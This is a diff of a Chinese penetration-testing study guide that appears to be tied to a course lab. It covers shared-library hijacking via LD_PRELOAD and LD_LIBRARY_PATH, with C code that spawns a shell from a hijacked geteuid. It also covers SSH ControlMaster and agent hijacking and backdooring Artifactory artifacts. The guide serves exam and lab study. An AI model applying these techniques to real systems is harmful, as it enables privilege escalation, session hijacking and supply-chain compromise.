@@ -6,7 +6,7 @@
 
 > 对应场景表：36 Linux 上传站会执行 ELF 但还要通过业务检查 · 37 Linux 目标有杀毒软件 · 38 Linux 程序从可控位置加载共享库 · 39 sudo 只允许一个编辑器/解释器 · 40 能覆盖制品但不能直接登录下载制品的机器 · 48 没有 SSH 密码但存在已认证的复用连接。
 >
-> 技术对齐：`Payloads (XOR Payload Encoder / Simple Loader / Shared Library LD PRELOAD / Shared Library LD LIBRARY Path)`、`Abusing SUIDs`、`SSH Hijacking with ControlMaster / SSH Agent Forwarding`、`Artifactory (JFrog)` 各节。
+> **教材依据：** 第 15 章（§15.1 用户配置文件后门、§15.2 Linux AV 绕过、§15.3 共享库劫持 `LD_LIBRARY_PATH` 与 `LD_PRELOAD`）、第 19 章（§19.1.3–19.1.4 SSH ControlMaster 与 SSH-Agent 转发劫持、§19.2 DevOps — Ansible 与 Artifactory 制品投毒）；Challenge 3、5、6。
 >
 > 统一占位符：`LHOST`（攻击机 IP）`LPORT`（监听端口）`TARGET`（目标地址）`USER` `PASS` `DOMAIN` `PAYLOAD`。所有命令默认在 x86_64 Linux 上执行。
 
@@ -562,7 +562,7 @@ Linux 主机上有 AV（典型是 ClamAV 的 on-access/on-scan 守护，考试�
 **B. LD_LIBRARY_PATH 线（`m13-shared-library-ldlibrarypath.c`）**
 1. 程序缺库（`ldd` 显示 `not found`，如 `libcrypto.so.1.1`）→ 库名必须与缺失库**完全一致**。
 2. 在可控目录放同名 .so，用 `LD_LIBRARY_PATH=/可控目录` 前置搜索：`LD_LIBRARY_PATH=/tmp/x TARGET_BIN`。
-3. .so 必须导出该库被程序用到的符号（缺哪个补哪个：先用 `nm -D 原库` 抄导出表做桩，或用 cheat sheet 提供的“先 dlopen 真库再转发”模式），同时 `__attribute__((constructor))` 先跑我们的代码。
+3. .so 必须导出该库被程序用到的符号（缺哪个补哪个：先用 `nm -D 原库` 抄导出表做桩，或用 速查笔记 提供的“先 dlopen 真库再转发”模式），同时 `__attribute__((constructor))` 先跑我们的代码。
 4. 用 `ldd` 验证解析到的路径变成我们的 .so：`LD_LIBRARY_PATH=/可控目录 ldd TARGET_BIN`。
 5. 触发程序运行（服务重启/任务/等待 cron），确认我们的代码以目标身份执行。
 
@@ -649,6 +649,8 @@ static void fire_payload(void)
         pid_t grand = fork();
         if (grand == 0) {
             setsid();
+            unsetenv("LD_PRELOAD");
+            unsetenv("LD_LIBRARY_PATH");
             execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
             _exit(127);
         }
@@ -745,6 +747,8 @@ static void fire_payload(void)
         pid_t grand = fork();
         if (grand == 0) {
             setsid();
+            unsetenv("LD_PRELOAD");
+            unsetenv("LD_LIBRARY_PATH");
             execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
             _exit(127);
         }
@@ -768,7 +772,7 @@ static void *resolve_real(const char *name)
     return sym;
 }
 
-/* 导出符号模板①：geteuid —— cheat sheet 里 LD_PRELOAD/LD_LIBRARY_PATH 两节都用这个符号。
+/* 导出符号模板①：geteuid —— 速查笔记 里 LD_PRELOAD/LD_LIBRARY_PATH 两节都用这个符号。
  * 第一次被调用时触发载荷，随后把调用原样转给真实 geteuid，返回值不打折。 */
 uid_t geteuid(void)
 {
@@ -1179,7 +1183,7 @@ esac
 ## 场景 40 · 你能覆盖制品，但不能直接登录下载制品的机器
 
 ### 场景回顾
-实验里有一台制品仓库/分发服务（对齐 cheat sheet 的 **Artifactory (JFrog)** 类场景）：我们获得了对制品存储的写能力（能**覆盖/替换**某个会被下游机器下载并执行的制品），但**无法直接 SSH/登录那些下载制品的消费机器**。目标是：让消费端在下次拉取/执行该制品时跑我们的代码（反连/植入），并尽量保持制品“看起来正常”（文件名、架构、业务行为不变）以免被发现。
+实验里有一台制品仓库/分发服务（对齐课程教材 §19.2.8 的 **Artifactory (JFrog)** 类场景）：我们获得了对制品存储的写能力（能**覆盖/替换**某个会被下游机器下载并执行的制品），但**无法直接 SSH/登录那些下载制品的消费机器**。目标是：让消费端在下次拉取/执行该制品时跑我们的代码（反连/植入），并尽量保持制品“看起来正常”（文件名、架构、业务行为不变）以免被发现。
 
 ### 前提与假设
 - 已拿到制品仓库侧的可写点（如 Artifactory 管理/上传接口、备份库里的凭据、或文件系统写权限），能定位制品在存储中的实际文件路径。
@@ -1189,7 +1193,7 @@ esac
 ### 准备（攻击机侧）
 1. 确认制品仓库进程与布局（Artifactory 常规路径 `/opt/jfrog/artifactory/`）：
    - `ps aux | grep artifactory`
-   - 备份/凭据线索：`/opt/jfrog/artifactory/var/backup/access`（含加密凭据/DB 备份），或数据目录 `.../var/data/access/derby`（必要时可拷出离线看，见 cheat sheet）。
+   - 备份/凭据线索：`/opt/jfrog/artifactory/var/backup/access`（含加密凭据/DB 备份），或数据目录 `.../var/data/access/derby`（必要时可拷出离线看，见速查章节）。
 2. 定位目标制品文件：在 filestore 里按文件名/校验和找（Artifactory 通常有二进制存储目录 + 元数据），确认**架构与格式**（`file`、`readelf -h`：x86_64 消费端不能跑 arm 制品）。
 3. 构造替换物：
    - 保留原业务行为（若场景要求消费端正常使用不报错），叠加我们的代码；或直接做成“先反连、再执行原逻辑”的包装。
@@ -1532,7 +1536,7 @@ esac
 1. 枚举可复用资产：
    - ControlMaster socket：`find ~/.ssh -name 'control*' -o -path '*controlmaster*' 2>/dev/null`、`ls -la ~/.ssh/`、`ps aux | grep 'ssh -M'`、`lsof -U 2>/dev/null | grep -i control`（同用户可见）。
    - Agent：`ls /tmp/ssh-*/agent.* 2>/dev/null`、`echo $SSH_AUTH_SOCK`、`ssh-add -l`。
-2. 若 config 没有 ControlMaster 但我们有该用户家目录写权限且其正有活动连接：可以注入 `~/.ssh/config` 让后续连接复用（`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`），见 cheat sheet。
+2. 若 config 没有 ControlMaster 但我们有该用户家目录写权限且其正有活动连接：可以注入 `~/.ssh/config` 让后续连接复用（`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`），见速查章节。
 3. 本地/目标上准备用于确认身份的命令（`id`、`hostname`）。
 
 ### 执行步骤
